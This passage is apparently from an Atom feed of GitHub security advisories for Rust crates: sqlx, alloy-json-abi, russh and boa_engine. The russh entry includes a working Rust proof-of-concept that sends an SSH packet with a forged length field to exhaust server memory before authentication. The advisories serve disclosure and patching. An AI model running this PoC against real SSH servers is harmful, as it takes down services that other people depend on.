<h2 id="resolution">Resolution</h2>
<p>Work has started on a branch to add <code>#[deny]</code> directives for the following Clippy lints:</p>
<ul>
<li><a href="https://rust-lang.github.io/rust-clippy/master/#/cast_possible_truncation"><code>cast_possible_truncation</code></a></li>
<li><a href="https://rust-lang.github.io/rust-clippy/master/#/cast_possible_wrap"><code>cast_possible_wrap</code></a></li>
<li><a href="https://rust-lang.github.io/rust-clippy/master/#/cast_sign_loss"><code>cast_sign_loss</code></a></li>
</ul>
<p>and to manually audit the code that they flag.</p>
<p>A fix is expected to be included in the <code>0.8.1</code> release (still WIP as of writing).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/launchbadge/sqlx/issues/3440">https://github.com/launchbadge/sqlx/issues/3440</a></li>
<li><a href="https://github.com/launchbadge/sqlx/blob/6f2905695b9606b5f51b40ce10af63ac9e696bb8/sqlx-postgres/src/arguments.rs#L163">https://github.com/launchbadge/sqlx/blob/6f2905695b9606b5f51b40ce10af63ac9e696bb8/sqlx-postgres/src/arguments.rs#L163</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0363.html">https://rustsec.org/advisories/RUSTSEC-2024-0363.html</a></li>
<li><a href="https://github.com/advisories/GHSA-xmrp-424f-vfpx">https://github.com/advisories/GHSA-xmrp-424f-vfpx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xmrp-424f-vfpx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-19T16:02:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[alloy-json-abi] Stack overflow when parsing specially crafted JSON ABI strings]]></title>
        <id>https://github.com/advisories/GHSA-8327-84cj-8xjm</id>
        <link href="https://github.com/advisories/GHSA-8327-84cj-8xjm"/>
        <updated>2024-08-15T22:10:08.000Z</updated>
        <content type="html"><![CDATA[<p>Affected versions of the <code>alloy-json-abi</code> crate did not properly handle parsing of malformatted JSON ABI strings. The <code>JsonAbi::parse</code> method can be tricked into a stack overflow when processing specially crafted input. </p>
<p>This stack overflow can lead to a crash of the application using this crate, potentially causing a denial of service.</p>
<p>The flaw was corrected in commit <a href="https://github.com/alloy-rs/core/commit/4790c47518024bd391bbd6815b00f501bad76a15">4790c47</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/alloy-rs/core/issues/702">https://github.com/alloy-rs/core/issues/702</a></li>
<li><a href="https://github.com/alloy-rs/core/commit/4790c47518024bd391bbd6815b00f501bad76a15">https://github.com/alloy-rs/core/commit/4790c47518024bd391bbd6815b00f501bad76a15</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0362.html">https://rustsec.org/advisories/RUSTSEC-2024-0362.html</a></li>
<li><a href="https://github.com/advisories/GHSA-8327-84cj-8xjm">https://github.com/advisories/GHSA-8327-84cj-8xjm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8327-84cj-8xjm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-15T22:10:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[russh] Russh has an OOM Denial of Service due to allocation of untrusted amount]]></title>
        <id>https://github.com/advisories/GHSA-vgvv-x7xg-6cqg</id>
        <link href="https://github.com/advisories/GHSA-vgvv-x7xg-6cqg"/>
        <updated>2024-08-21T18:59:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Allocating an untrusted amount of memory allows any unauthenticated user to OOM a russh server.</p>
<h3 id="details">Details</h3>
<p>An SSH packet consists of a 4-byte big-endian length, followed by a byte stream of this length.
After parsing and potentially decrypting the 4-byte length, russh allocates enough memory for this bytestream, as a performance optimization to avoid reallocations later.</p>
<p><a href="https://github.com/Eugeny/russh/blob/4eaa080e7532662023f75e8fff45b743fe607f8c/russh/src/cipher/mod.rs#L254">https://github.com/Eugeny/russh/blob/4eaa080e7532662023f75e8fff45b743fe607f8c/russh/src/cipher/mod.rs#L254</a></p>
<p>But this length is entirely untrusted and can be set to any value by the client, causing this much memory to be allocated, which will cause the process to OOM within a few such requests.</p>
<p>RFC 4253 contains an explicit section on packet length limits: <a href="https://datatracker.ietf.org/doc/html/rfc4253#section-6.1">https://datatracker.ietf.org/doc/html/rfc4253#section-6.1</a></p>
<blockquote>
<p>However, implementations SHOULD check that the packet length is reasonable in order for the implementation to avoid denial of service and/or buffer overflow attacks.</p>
</blockquote>
<h3 id="poc">PoC</h3>
<p>Running the <code>echoserver</code> example on port 2222 (<code>cd russh &amp;&amp; cargo run --release --example echoserver</code>), the provided Rust program can be executed against this echoserver and will cause it to OOM within a few tries.</p>
<details>
<summary>Rust code to run against the echo server</summary>

<p><code>Cargo.toml</code></p>
<pre><code class="language-toml">[package]
name = "poc"
version = "0.1.0"
edition = "2021"

[dependencies]
hex-literal = "=0.4.1"
</code></pre>
<p><code>main.rs</code></p>
<pre><code class="language-rust">use std::time::Duration;
use std::{error::Error, net::SocketAddr};

use std::{
    io::{Read, Write},
    net::TcpStream,
};

fn main() -&gt; Result&lt;(), Box&lt;dyn Error&gt;&gt; {
    loop {
        attempt()?;
        eprintln!("still running, trying again in a few seconds");
        std::thread::sleep(Duration::from_secs(2));
    }
}

fn attempt() -&gt; Result&lt;(), Box&lt;dyn Error&gt;&gt; {
    for i in 0..5 {
        eprintln!("iteration {i}");
        let mut s = TcpStream::connect("0.0.0.0:2222".parse::&lt;SocketAddr&gt;().unwrap())?;
        s.write_all(b"SSH-2.0-OpenSSH_9.7\r\n")?;
        s.read(&amp;mut [0; 1000])?;
        // A KeyExchangeInit copied from an OpenSSH client run but the length has been replaced with 0xFFFFFF00.
        s.write_all(&amp;hex_literal::hex!(
            "
        ffffff00071401af35150e67f2bc6dc4bc6b5330901900000131736e74727570373631783235353
        1392d736861353132406f70656e7373682e636f6d2c637572766532353531392d7368613235362c
        637572766532353531392d736861323536406c69627373682e6f72672c656364682d736861322d6
        e697374703235362c656364682d736861322d6e697374703338342c656364682d736861322d6e69
        7374703532312c6469666669652d68656c6c6d616e2d67726f75702d65786368616e67652d73686
        13235362c6469666669652d68656c6c6d616e2d67726f757031362d7368613531322c6469666669
        652d68656c6c6d616e2d67726f757031382d7368613531322c6469666669652d68656c6c6d616e2
        d67726f757031342d7368613235362c6578742d696e666f2d632c6b65782d7374726963742d632d
        763030406f70656e7373682e636f6d000001cf7373682d656432353531392d636572742d7630314
        06f70656e7373682e636f6d2c65636473612d736861322d6e697374703235362d636572742d7630
        31406f70656e7373682e636f6d2c65636473612d736861322d6e697374703338342d636572742d7
        63031406f70656e7373682e636f6d2c65636473612d736861322d6e697374703532312d63657274
        2d763031406f70656e7373682e636f6d2c736b2d7373682d656432353531392d636572742d76303
        1406f70656e7373682e636f6d2c736b2d65636473612d736861322d6e697374703235362d636572
        742d763031406f70656e7373682e636f6d2c7273612d736861322d3531322d636572742d7630314
        06f70656e7373682e636f6d2c7273612d736861322d3235362d636572742d763031406f70656e73
        73682e636f6d2c7373682d656432353531392c65636473612d736861322d6e697374703235362c6
        5636473612d736861322d6e697374703338342c65636473612d736861322d6e697374703532312c
        736b2d7373682d65643235353139406f70656e7373682e636f6d2c736b2d65636473612d7368613
        22d6e69737470323536406f70656e7373682e636f6d2c7273612d736861322d3531322c7273612d
        736861322d3235360000006c63686163686132302d706f6c7931333035406f70656e7373682e636
        f6d2c6165733132382d6374722c6165733139322d6374722c6165733235362d6374722c61657331
        32382d67636d406f70656e7373682e636f6d2c6165733235362d67636d406f70656e7373682e636
        f6d0000006c63686163686132302d706f6c7931333035406f70656e7373682e636f6d2c61657331
        32382d6374722c6165733139322d6374722c6165733235362d6374722c6165733132382d67636d4
        06f70656e7373682e636f6d2c6165733235362d67636d406f70656e7373682e636f6d000000d575
        6d61632d36342d65746d406f70656e7373682e636f6d2c756d61632d3132382d65746d406f70656
        e7373682e636f6d2c686d61632d736861322d3235362d65746d406f70656e7373682e636f6d2c68
        6d61632d736861322d3531322d65746d406f70656e7373682e636f6d2c686d61632d736861312d6
        5746d406f70656e7373682e636f6d2c756d61632d3634406f70656e7373682e636f6d2c756d6163
        2d313238406f70656e7373682e636f6d2c686d61632d736861322d3235362c686d61632d7368613
        22d3531322c686d61632d73686131000000d5756d61632d36342d65746d406f70656e7373682e63
        6f6d2c756d61632d3132382d65746d406f70656e7373682e636f6d2c686d61632d736861322d323
        5362d65746d406f70656e7373682e636f6d2c686d61632d736861322d3531322d65746d406f7065
        6e7373682e636f6d2c686d61632d736861312d65746d406f70656e7373682e636f6d2c756d61632
        d3634406f70656e7373682e636f6d2c756d61632d313238406f70656e7373682e636f6d2c686d61
        632d736861322d3235362c686d61632d736861322d3531322c686d61632d736861310000001a6e6
        f6e652c7a6c6962406f70656e7373682e636f6d2c7a6c69620000001a6e6f6e652c7a6c6962406f
        70656e7373682e636f6d2c7a6c69620000000000000000000000000000000000000000
        "
        ))?;

        s.shutdown(std::net::Shutdown::Both)?;
    }
    Ok(())
}
</code></pre>
</details>

<h3 id="impact">Impact</h3>
<p>Due to this allocation, a russh server can be brought to OOM, causing a DoS.
Since this happens before authentication, it can be done by any user that has access to the TCP port over the internet.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Eugeny/russh/security/advisories/GHSA-vgvv-x7xg-6cqg">https://github.com/Eugeny/russh/security/advisories/GHSA-vgvv-x7xg-6cqg</a></li>
<li><a href="https://github.com/Eugeny/russh/commit/f660ea3f64b86d11d19e33076012069f02431e55">https://github.com/Eugeny/russh/commit/f660ea3f64b86d11d19e33076012069f02431e55</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43410">https://nvd.nist.gov/vuln/detail/CVE-2024-43410</a></li>
<li><a href="https://github.com/advisories/GHSA-vgvv-x7xg-6cqg">https://github.com/advisories/GHSA-vgvv-x7xg-6cqg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vgvv-x7xg-6cqg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-14T21:18:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[boa_engine] Boa has an uncaught exception when transitioning the state of `AsyncGenerator` objects]]></title>
        <id>https://github.com/advisories/GHSA-f67q-wr6w-23jq</id>
        <link href="https://github.com/advisories/GHSA-f67q-wr6w-23jq"/>
        <updated>2024-08-15T21:37:58.000Z</updated>
        <content type="html"><![CDATA[<p>A wrong assumption made when handling ECMAScript's <code>AsyncGenerator</code> operations can cause an uncaught exception on certain scripts.</p>
<h2 id="details">Details</h2>
<p>Boa's implementation of <code>AsyncGenerator</code> makes the assumption that the state of an <code>AsyncGenerator</code> object cannot change while resolving a promise created by methods of <code>AsyncGenerator</code> such as <code>%AsyncGeneratorPrototype%.next</code>, <code>%AsyncGeneratorPrototype%.return</code>, or <code>%AsyncGeneratorPrototype%.throw</code>.
However, a carefully constructed code could trigger a state transition from a getter method for the promise's <code>then</code> property, which causes the engine to fail an assertion of this assumption, causing an uncaught exception. This could be used to create a Denial Of Service attack in applications that run arbitrary ECMAScript code provided by an external user.</p>
<h2 id="patches">Patches</h2>
<p>Version 0.19.0 is patched to correctly handle this case.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Users unable to upgrade to the patched version would want to use <a href="https://doc.rust-lang.org/std/panic/fn.catch_unwind.html"><code>std::panic::catch_unwind</code></a> to ensure any exceptions caused by the engine don't impact the availability of the main application.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/boa-dev/boa/commit/69ea2f52ed976934bff588d6b566bae01be313f7">https://github.com/boa-dev/boa/commit/69ea2f52ed976934bff588d6b566bae01be313f7</a></li>
<li><a href="https://github.com/tc39/ecma262/security/advisories/GHSA-g38c-wh3c-5h9r">https://github.com/tc39/ecma262/security/advisories/GHSA-g38c-wh3c-5h9r</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/boa-dev/boa/security/advisories/GHSA-f67q-wr6w-23jq">https://github.com/boa-dev/boa/security/advisories/GHSA-f67q-wr6w-23jq</a></li>
<li><a href="https://github.com/tc39/ecma262/security/advisories/GHSA-g38c-wh3c-5h9r">https://github.com/tc39/ecma262/security/advisories/GHSA-g38c-wh3c-5h9r</a></li>
<li><a href="https://github.com/boa-dev/boa/commit/69ea2f52ed976934bff588d6b566bae01be313f7">https://github.com/boa-dev/boa/commit/69ea2f52ed976934bff588d6b566bae01be313f7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43367">https://nvd.nist.gov/vuln/detail/CVE-2024-43367</a></li>
<li><a href="https://github.com/advisories/GHSA-f67q-wr6w-23jq">https://github.com/advisories/GHSA-f67q-wr6w-23jq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f67q-wr6w-23jq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-14T20:49:51.000Z</published>
    </entry>
</feed>